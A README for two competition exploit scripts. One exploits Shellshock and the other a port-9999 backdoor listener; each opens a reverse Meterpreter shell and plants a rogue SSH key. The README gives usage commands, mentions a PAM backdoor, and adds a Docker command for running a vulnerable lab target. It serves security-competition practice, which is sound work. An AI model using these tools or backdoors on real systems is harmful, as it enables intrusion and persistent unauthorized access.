# Shell Shock
This was one of the automated exploit scripts that I developed for the [cyber force competition](https://cyberforcecompetition.com/). It uses a wrapper, ```shellshock.py```, for the rc script, ```shellshock.rc```. It's only been tested on CentOS 7, Debian 8, and Ubuntu 16.04. 

Some of the code will need to be modified to work for your environment. In particular, the path for the curl commands in ```shellshock.py``` (it's currently set to ```/cgi-bin/admin.cgi```), as well as the path to the target user's home directory for the ssh key backdoor in ```shellshock.rc``` (it's currently set to ```/home/blueteam/```).
```
Description:
  shellshock.py will exploit the shell shock vulnerability and create a reverse meterpreter shell. It will follow this with a rogue ssh key.

Usage:
  python3 shellshock.py -l <your ip address> -r <target ip address>

Arguments:
  -h, --help            show this help message and exit
  -l LHOST, --lhost LHOST
                        Local IP Address
  -r RHOST, --rhost RHOST
                        Remote IP Address

Examples:
  Get the help screen:
    python3 shellshock.py -h
  Attempt to pwn 10.0.0.5 from 10.0.0.130:
    python3 shellshock.py -l 10.0.0.130 -r 10.0.0.5

Author:
  Jayson Grace (jayson.e.grace@gmail.com)
```

## Test exploitation with Docker
This will throw errors for the post exploitation stuff, but it will allow you to get a session for experimentation.
1. Run vulnerable container: ```docker run -d -p 80:80 hmlio/vaas-cve-2014-6271```
2. Change the path for the curl commands in ```shellshock.py``` from ```http://{args.rhost}/cgi-bin/admin.cgi``` to ```http://{args.rhost}/cgi-bin/stats```
3. Set -r parameter to the IP of the system running the container

# Rogue Backdoor
This was another one of the automated exploit scripts that I developed for the [cyber force competition](https://cyberforcecompetition.com/). It uses a wrapper, ```rogue_backdoor.py```, for the rc script, ```rogue_backdoor.rc```.It's only been tested on CentOS 7, Debian 8, and Ubuntu 16.04. 

The premise for this attack vector was a cronjob on the target system that would open up a listener on port 9999.

Some of the code will need to be modified to work for your environment. In particular, there is an option to setup a pam backdoor that would reside in ```post/```. Additionally, the target port is hardcoded as 9999 in ```rogue_backdoor.py```, and the path to the target user's home directory for the ssh key backdoor in ```rogue_backdoor.rc``` (it's currently set to ```/home/blueteam/```).
```
Description:
  rogue_backdoor.py will exploit a rogue backdoor vulnerability and create a reverse meterpreter shell. It will follow this with a rogue ssh key.
  
Usage:
  python3 rogue_backdoor.py -l <your ip address> -r <target ip address>

Arguments:
  -h, --help            show this help message and exit
  -l LHOST, --lhost LHOST
                        Local IP Address
  -r RHOST, --rhost RHOST
                        Remote IP Address

Examples:
  Get the help screen:
    python3 rogue_backdoor.py -h
  Attempt to pwn 10.0.0.5 from 10.0.0.131:
    python3 rogue_backdoor.py -l 10.0.0.131 -r 10.0.0.5

Author:
  Jayson Grace (jayson.e.grace@gmail.com)
```
